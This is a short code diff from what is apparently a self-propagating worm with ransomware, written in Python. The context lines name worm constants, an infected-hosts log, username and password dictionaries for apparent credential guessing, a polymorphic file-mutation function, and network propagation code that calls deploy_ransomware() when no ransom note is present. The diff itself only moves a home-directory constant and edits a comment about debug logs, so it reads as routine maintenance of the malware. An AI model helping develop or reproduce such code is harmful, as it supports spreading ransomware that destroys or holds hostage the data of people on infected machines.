@@ -83,7 +83,6 @@ logger.addHandler(file_handler)
 
 # Worm configuration constants
 REMOTE_DIR = "/tmp/default/"
-HOME_DIR = f"/home/{os.getlogin()}"
 INFECTED_LOG = "infected.log"
 USERNAME_DICT = "username.txt"
 PASSWORD_DICT = "password.txt"
@@ -160,12 +159,14 @@ def polymorph_file(file_path):
 # Worm Core (Network Propagation Functions)
 ###########################################
 
+HOME_DIR = f"/home/{os.getlogin()}"
+
 def initiate_worm():
     """Perform scanning, infection, and mutation propagation."""
     # If ransomware note doesn't exist, perform ransom operation.
     if not os.path.isfile(f"{HOME_DIR}/openme.txt"):
         deploy_ransomware()
-    # Remove the debug log file if present
+    #Remove the debug log file if present -- uncomment if you want to examine each host's logs
     #if os.path.isfile("/tmp/dmsg.log"):
     #    os.remove("/tmp/dmsg.log")
 
